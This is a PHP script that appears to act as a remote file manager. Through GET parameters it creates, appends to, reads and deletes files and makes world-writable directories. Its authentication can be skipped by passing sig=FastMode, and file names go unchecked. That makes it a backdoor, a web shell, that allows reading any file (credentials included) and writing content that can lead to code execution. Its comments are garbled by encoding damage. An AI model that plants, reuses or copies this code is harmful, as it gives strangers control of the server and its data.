<?php
header("Content-type: text/html; charset=gb2312");

$act=$_GET["action"];
$key=$_GET["key"];
$sig=$_GET["sig"];

$verifyNum=verify();
switch ($verifyNum) {
    case 0:
        break;
    case 1:
        echo 'No Authrority --- Lack the Key';
        exit;
    case 2:
        echo 'No Authrority --- Array-S1-error';
        exit;
    case 3:
        echo 'No Authrority --- Array-S2-error';
        exit;
    case 4:
        echo 'No Authrority --- Array-S3-error';
        exit;
}

if($act=="create") {
    $name=$_GET["filename"];
    if($sig=="FastMode") {if($name=="index.php") {echo 'FastMode Forbid';exit;}}
    $fileContent=$_GET["fileContent"];
    $myfile = fopen("$name", "a+") or die("ERROR");
    fwrite($myfile, $fileContent);
    fwrite($myfile ,"\r\n");
    echo 'OK.';
    exit;
};

if($act=="cr") {
    if($sig=="FastMode") {echo 'FastMode Forbid';exit;}
    $name=$_GET["filename"];
    $fileContent=$_GET["fileContent"];
    if(file_exists($name)) {
        $content = file_get_contents($name);
        echo "$content";
        exit;
    };
    $myfile = fopen("$name", "a+") or die("ERROR");
    fwrite($myfile, $fileContent);
    fwrite($myfile ,"\r\n");
    echo 'OK';
    exit;
};

if($act=="read") {
    $myff = $_GET["filename"];
    if(!file_exists($myff)) {echo 'ERROR';exit;};
    $content = file_get_contents($myff);
    $content = str_replace("\r\n","<br />",$content);
    echo "$content";
    exit;
};

if($act=="delete") {
   if($sig=="FastMode") {echo 'FastMode Forbid';exit;}
   $file = $_GET["filename"];
   if(!file_exists($file)) {echo 'ERROR';exit;};
   if(!unlink($file)) {echo ("Error-delete");exit;}
   echo 'OK';
   exit;
};

if($act=="md") {
    if($sig=="FastMode") {echo 'FastMode Forbid';exit;}
    $mydir = $_GET["dir"];
    if(!file_exists($mydir)) {mkdir($mydir,0777,true);echo 'OK';exit;} else {echo 'EXISTED';exit;}
}

if($act=="exist") {
    $filename = $_GET["filename"];
    if(file_exists($filename)) {echo 'EXIST';} else {echo 'NOT';}
    exit;
}
exit;
if(!file_exists(Unlock.mp)) {echo 'Safe Lock Is activated.';unlink("main.php");exit;}
echo 'NO-PARAMENT';


function verify() {
   global $key, $sig;
   if($sig=="FastMode") {return 0;}
   //��Կ�ж�
   $keyname="./keys/$key.key";
   if(!file_exists($keyname)) {return 1;}
   //�����ж�1---���������жϣ�Ҫ��9����ʣ��8
   $sig_ver = $sig % 9;
   if($sig_ver != 8 ) {return 2;} 
   $sig_ver2 = substr($sig,-4);
   //�����ж�2---����ǰ����4���ַ�֮ǰ���������5��ʣ��4
   $sig_ver3 = $sig_ver2 % 5;
   if($sig_ver3 != 4) {return 3;}
   //�����ж�3---5���ַ���3��������000
   if(substr($sig,5,3) !=  000) {return 4;}
   return 0;
};
?>